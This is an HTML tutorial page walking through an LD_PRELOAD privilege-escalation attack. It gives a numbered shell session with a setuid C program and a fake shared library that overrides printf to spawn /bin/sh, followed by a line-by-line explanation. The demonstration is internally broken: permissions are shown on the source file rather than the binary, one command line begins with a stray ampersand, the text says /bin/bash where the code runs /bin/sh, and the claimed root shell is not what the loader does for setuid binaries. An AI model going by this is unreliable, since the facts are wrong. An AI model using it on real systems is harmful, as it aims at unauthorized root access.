<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>LD_PRELOAD Walkthrough</title>
</head><body>LD_PRELOAD Exploit:<br/>
<br/>
This attack involves .so files (part of the dynamic link library) being used by programs. The attacker can add a program pretending to be one of these libraries so that when a program is run it will execute the program pretending to be a library, this is useful if you are calling a program that has the suid bit set to root, this. So when the program is first run, it will attempt to load the library it requires (but it has been replaced with code the attacker wants executed) and thus runs the commands in the program placed by the attacker, with the permissions of the owner of the calling program. A full example of this is demonstrated below:<br/>
<br/>
1)&#09;$ cat me-root.c<br/>
2)&#09;...#include &lt;stdio.h&gt;<br/>
3)&#09;...#include &lt;unistd.h&gt;<br/>
4)&#09;...main()<br/>
5)&#09;...{<br/>
6)&#09;......setuid(0);<br/>
7)&#09;......setgid(0);<br/>
8)&#09;......printf("Congratulations you are root!");<br/>
9)&#09;...}<br/>
10)&#09;$ gcc -o me-root me-root.c<br/>
11)&#09;$ ls -l me-root.c<br/>
12)&#09;---s--x--x 1 root root 4365 Mar 16 14:05 me-root.c<br/>
13)&#09;$ cat me-root_so.c<br/>
14)&#09;...void printf(char *str)<br/>
15)&#09;...{<br/>
16)&#09;......execl("/bin/sh","sh",0);<br/>
17)&#09;...}<br/>
18)&#09;$ gcc -shared -o me-root_so.so me-root_so.c<br/>
19)&#09;&amp; LD_PRELOAD=./me-root_so.so<br/>
20)&#09;$ export LD_PRELOAD<br/>
21)&#09;$ ./me-root<br/>
22)&#09;# whoami<br/>
23)&#09;root<br/>
<br/>
I will explain the above attack in detail:<br/>
Lines 1 to 9: The attacker creates a simple C program that runs gives sets the userid and groupid to 0 (root). <br/>
Line 10: The attacker compiles the program created above and calls it me-root.<br/>
Lines 11 &amp; 12: The attacker checks the file permissions on the me-root program.<br/>
Lines 13 to 17: The attacker creates the program that will pretend to be part of a library, it executes /bin/bash.<br/>
Line 18: The attacker compiles the pretend library program as a shared library and calls it me-root_so.so.<br/>
Lines 19 &amp; 20: The attacker adds me-root_so.so, and exports LD_PRELOAD, so now when me-root is run it will execute the program <br/>
me-root_so.so (pretending to be a library) with the permissions of me-root (in this case the permissions of userid 0 - which is the root account!).<br/>
Line 21: The attacker runs the me-root program.<br/>
Lines 22 &amp; 23: The attacker verifies who s/he is, line 23 confirms s/he is root.</body></html>